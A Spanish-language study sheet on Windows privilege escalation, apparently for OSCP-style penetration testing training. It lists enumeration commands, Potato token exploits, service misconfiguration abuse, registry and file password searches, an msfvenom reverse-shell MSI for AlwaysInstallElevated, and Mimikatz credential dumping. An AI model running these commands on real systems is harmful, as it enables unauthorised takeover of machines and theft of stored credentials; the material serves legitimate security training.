12 · Escalada de privilegios en Windows

Objetivo: pasar de un usuario normal a Administrator o NT AUTHORITY\SYSTEM. La lógica es la misma que en Linux: enumerar y encontrar la mala configuración.

1. Enumeración inicial

> whoami /priv            # ⭐ privilegios (busca SeImpersonate, SeBackup...)
> whoami /groups
> systeminfo              # versión, parches (hotfix) → exploits
> net user; net localgroup administrators
> ipconfig /all           # ¿más redes? (pivoting)

2. Enumeración automática

# Sube winPEAS.exe y ejecútalo
> winPEASx64.exe
# Alternativas: PowerUp.ps1, Seatbelt.exe, WinPEAS versión .bat
PS> Import-Module .\PowerUp.ps1; Invoke-AllChecks

3. Vectores principales

a) Privilegios de token (lo más rápido)

⚠️ SeImpersonatePrivilegeSi whoami /priv muestra SeImpersonatePrivilege activado (típico de cuentas de servicio y www de IIS), usa un exploit “Potato” para saltar a SYSTEM:
> PrintSpoofer.exe -i -c cmd       # o GodPotato, JuicyPotato, RoguePotato
> GodPotato.exe -cmd "cmd /c whoami"   # → nt authority\system

b) Servicios inseguros

# Unquoted Service Path: ruta con espacios y sin comillas
> wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# Si es C:\Program Files\Mi App\srv.exe sin comillas y puedes escribir en Program Files:
# colocas C:\Program.exe malicioso
# Permisos débiles del servicio (puedes cambiar su binario):
> sc config servicio binPath= "C:\temp\shell.exe"
> sc stop servicio & sc start servicio

c) Credenciales guardadas

> reg query HKLM /f password /t REG_SZ /s
> cmdkey /list                          # credenciales guardadas
> dir /s *unattend.xml *sysprep* web.config
> findstr /si password *.txt *.ini *.config *.xml

d) AlwaysInstallElevated

> reg query HKLM\...\Installer /v AlwaysInstallElevated
> reg query HKCU\...\Installer /v AlwaysInstallElevated
# Si ambos = 1: generas un .msi con msfvenom y lo instalas → SYSTEM
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f msi -o x.msi
> msiexec /quiet /qn /i x.msi

4. Volcar credenciales: Mimikatz

# Con privilegios de admin/SYSTEM
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords     # contraseñas/hashes en memoria
mimikatz# lsadump::sam                  # hashes locales (SAM)
# Desde Kali con credenciales:
$ secretsdump.py dominio/user:pass@10.0.2.5

5. Exploits del sistema (último recurso)

> systeminfo             # mira "Hotfix(s)" instalados
# Herramienta que sugiere exploits según los parches que FALTAN:
$ windows-exploit-suggester / wesng con la salida de systeminfo
🔴 Nivel OSCP: orden recomendado1) whoami /priv (¿SeImpersonate? → Potato). 2) winPEAS. 3) Servicios (unquoted/permisos). 4) Credenciales (registro, ficheros, cmdkey). 5) AlwaysInstallElevated. 6) Scheduled tasks/autoruns. 7) Exploits por hotfix faltante. Documenta todo.
